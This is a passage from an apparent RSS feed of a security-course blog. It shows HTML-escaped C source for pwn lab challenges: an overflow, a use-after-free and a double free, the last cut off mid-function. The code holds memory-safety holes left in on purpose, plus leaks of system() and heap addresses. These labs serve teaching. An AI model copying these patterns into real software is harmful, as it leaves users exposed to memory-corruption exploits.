&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	n &lt;span style="color:#f92672">=&lt;/span> read(&lt;span style="color:#ae81ff">0&lt;/span>, name, n);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	name[n] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	strcpy(msg, name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	strcat(msg, &lt;span style="color:#e6db74">&amp;#34; hachamachama&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(msg);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;ECHO HACHAMA!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		read(&lt;span style="color:#ae81ff">0&lt;/span>, buf2, n2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(buf2, &lt;span style="color:#e6db74">&amp;#34;HACHAMA&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			write(&lt;span style="color:#ae81ff">1&lt;/span>, buf2, n2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x38(Lab - UAF)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/</guid><description>&lt;h1 id="simple-pwn-0x38lab---uaf">
 Simple PWN 0x38(Lab - UAF)
 &lt;a class="anchor" href="#simple-pwn-0x38lab---uaf">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ByxvsvNr6.png" alt="圖片" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">default_handle&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;EVENT: get event named &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>event_handle)(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span> &lt;span style="color:#f92672">*&lt;/span>entities[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. register entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. delete entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. set name&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;4. trigger event&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">register_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx] &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle &lt;span style="color:#f92672">=&lt;/span> default_handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Default Event&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">set_name&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Nmae Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		len &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name &lt;span style="color:#f92672">=&lt;/span> malloc(len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		read(&lt;span style="color:#ae81ff">0&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, len &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">trigger_event&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;gift1: %p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>system);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;gift2: %p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, ptr);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			register_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			set_name();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			trigger_event();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x39(Lab - Double Free)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/</guid><description>&lt;h1 id="simple-pwn-0x39lab---double-free">
 Simple PWN 0x39(Lab - Double Free)
 &lt;a class="anchor" href="#simple-pwn-0x39lab---double-free">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rkD83kaji">0x18(Lab - &lt;code>babynote&lt;/code>)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">note&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>content;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">note&lt;/span> notes[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">read_ul&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> strtoul(buf, NULL, &lt;span style="color:#ae81ff">10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">add_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[idx].len &lt;span style="color:#f92672">=&lt;/span> read_ul();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[idx].content &lt;span style="color:#f92672">=&lt;/span> malloc(notes[idx].len);
